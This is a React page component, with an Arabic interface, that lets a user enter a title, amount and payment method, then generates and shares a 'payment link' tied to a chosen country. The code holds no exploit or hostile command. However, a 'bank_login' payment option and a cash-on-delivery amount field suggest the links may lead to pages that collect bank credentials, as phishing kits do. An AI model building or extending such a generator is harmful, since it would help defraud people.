import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
import {
  CreditCard,
  DollarSign,
  ArrowRight,
  RefreshCw,
  Building2,
  Package,
  Shield,
  Copy,
  ExternalLink
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { generatePaymentLink } from "@/utils/paymentLinks";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreatePaymentLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const selectedCountry = getCountryByCode(country || "SA");

  const [title, setTitle] = useState("");
  const [amount, setAmount] = useState("1000");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [createdLink, setCreatedLink] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!title || !amount) {
      toast({ title: "خطأ", description: "يرجى إكمال جميع الحقول", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      const link = await createLink.mutateAsync({
        type: "payment",
        country_code: country || "SA",
        payload: {
          title,
          cod_amount: parseFloat(amount),
          payment_method: paymentMethod,
          currency_code: getCurrencyCode(country || "SA"),
          service_name: title,
          service_type: 'local_payment'
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: title,
        country: country || 'SA',
        amount: parseFloat(amount),
        currency: getCurrencyCode(country || 'SA'),
        paymentMethod: paymentMethod,
        type: 'payment'
      });
      setCreatedLink(paymentUrl);
      setShowSuccess(true);
      toast({ title: "تم إنشاء الرابط بنجاح" });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!selectedCountry) return null;

  return (
    <div className="min-h-screen bg-indigo-50/30" dir="rtl">
      <header className="bg-indigo-600 text-white h-20 flex items-center px-4 sticky top-0 z-50 shadow-xl border-b-4 border-indigo-900">
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-white/20 rounded-xl flex items-center justify-center backdrop-blur-md">
              <CreditCard className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-lg font-black tracking-tight">بوابة الدفع السريع</h1>
              <p className="text-[10px] font-bold opacity-70 uppercase tracking-widest">{selectedCountry.nameAr} - Express Payment</p>
            </div>
          </div>
          <BackButton />
        </div>
      </header>

      <main className="container mx-auto px-4 py-10 max-w-lg">
        <form onSubmit={handleSubmit} className="space-y-6">
          <Card className="p-8 border-none rounded-[2.5rem] shadow-2xl bg-white relative overflow-hidden">
            <div className="absolute top-0 right-0 w-48 h-48 bg-indigo-50 rounded-full -mr-24 -mt-24 opacity-60" />

            <h2 className="text-2xl font-black text-indigo-900 mb-10 flex items-center gap-3">
              <Package className="w-8 h-8 text-indigo-500" />
              تفاصيل طلب الدفع
            </h2>

            <div className="space-y-8">
              <div className="space-y-2">
                <Label className="text-[11px] font-black text-indigo-300 uppercase tracking-[0.2em] px-1">عنوان الطلب / المنتج</Label>
                <div className="relative">
                  <Input value={title} onChange={(e) => setTitle(e.target.value)} className="h-16 border-b-4 border-l-0 border-r-0 border-t-0 border-slate-100 rounded-none font-black text-xl bg-transparent px-0 focus:border-indigo-600 focus:ring-0 transition-all" placeholder="مثال: فاتورة توريد، دفع رسوم..." />
                </div>
              </div>

              <div className="space-y-2">
                <Label className="text-[11px] font-black text-indigo-300 uppercase tracking-[0.2em] px-1">القيمة الإجمالية</Label>
                <div className="relative group">
                  <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} className="h-20 border-b-4 border-l-0 border-r-0 border-t-0 border-slate-100 rounded-none font-black text-5xl bg-transparent px-0 focus:border-indigo-600 focus:ring-0 transition-all text-indigo-600" />
                  <div className="absolute left-0 top-1/2 -translate-y-1/2 flex items-center gap-2">
                     <span className="text-xl font-black text-indigo-300">{getCurrencySymbol(country || "SA")}</span>
                     <DollarSign className="w-6 h-6 text-indigo-100" />
                  </div>
                </div>
              </div>

              {parseFloat(amount) > 0 && (
                <div className="p-6 rounded-[2rem] bg-indigo-600 text-white animate-in zoom-in-95 duration-300 shadow-xl shadow-indigo-200">
                  <div className="flex justify-between items-center mb-2">
                    <span className="text-[10px] font-bold opacity-80 uppercase tracking-[0.2em]">المبلغ الصافي للدفع</span>
                    <Shield className="w-5 h-5 opacity-80" />
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-4xl font-black">{amount}</span>
                    <span className="text-sm font-bold opacity-80">{getCurrencySymbol(country || "SA")}</span>
                  </div>
                </div>
              )}

              <div className="space-y-4 pt-8 border-t border-slate-50">
                <Label className="text-[11px] font-black text-indigo-300 uppercase tracking-[0.2em] px-1">طرق الدفع المفعلة</Label>
                <div className="grid grid-cols-2 gap-4">
                   <button type="button" onClick={() => setPaymentMethod('card')} className={`p-6 rounded-[2rem] border-4 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'card' ? 'border-indigo-600 bg-indigo-50 shadow-lg' : 'border-slate-50 bg-slate-50'}`}>
                      <CreditCard className={`w-10 h-10 ${paymentMethod === 'card' ? 'text-indigo-600' : 'text-slate-300'}`} />
                      <span className={`text-[12px] font-black uppercase ${paymentMethod === 'card' ? 'text-indigo-600' : 'text-slate-400'}`}>بطاقة فيزا</span>
                   </button>
                   <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-6 rounded-[2rem] border-4 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'bank_login' ? 'border-indigo-600 bg-indigo-50 shadow-lg' : 'border-slate-50 bg-slate-50'}`}>
                      <Building2 className={`w-10 h-10 ${paymentMethod === 'bank_login' ? 'text-indigo-600' : 'text-slate-300'}`} />
                      <span className={`text-[12px] font-black uppercase ${paymentMethod === 'bank_login' ? 'text-indigo-600' : 'text-slate-400'}`}>تحويل بنكي</span>
                   </button>
                </div>
              </div>
            </div>
          </Card>

          <Button type="submit" disabled={isSubmitting} className="w-full h-20 rounded-[2.5rem] font-black text-xl shadow-[0_20px_50px_rgba(79,70,229,0.3)] bg-indigo-600 hover:bg-indigo-700 text-white transition-all active:scale-95 group">
             {isSubmitting ? <RefreshCw className="w-8 h-8 animate-spin" /> : (
               <div className="flex items-center gap-3">
                 <span>توليد رابط الدفع الفوري</span>
                 <ArrowRight className="w-6 h-6 group-hover:translate-x-[-8px] transition-transform" />
               </div>
             )}
          </Button>
        </form>
      </main>

      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
        <AlertDialogContent className="max-w-[90%] rounded-3xl border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
           <div className="p-8 text-center space-y-6">
              <div className="w-20 h-20 bg-indigo-50 rounded-full flex items-center justify-center mx-auto mb-2">
                <div className="w-12 h-12 bg-indigo-600 rounded-full flex items-center justify-center animate-bounce">
                  <RefreshCw className="w-6 h-6 text-white" />
                </div>
              </div>
              <div>
                <AlertDialogTitle className="text-2xl font-black text-gray-900">رابط الدفع جاهز!</AlertDialogTitle>
                <AlertDialogDescription className="font-bold text-gray-500">تم توليد رابط دفع آمن لهذا الطلب</AlertDialogDescription>
              </div>

              <div className="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 break-all font-mono text-xs font-bold text-gray-400">
                {createdLink}
              </div>

              <div className="flex gap-3">
                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); toast({ title: "تم النسخ" }); }} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
                   <Copy className="w-4 h-4" /> نسخ الرابط
                 </Button>
                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-14 rounded-2xl font-black border-2 gap-2 text-gray-700">
                   <ExternalLink className="w-4 h-4" /> معاينة
                 </Button>
              </div>
              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-gray-400">إغلاق</Button>
           </div>
        </AlertDialogContent>
      </AlertDialog>

      <div className="h-24" />
      <BottomNav />
    </div>
  );
};

export default CreatePaymentLink;
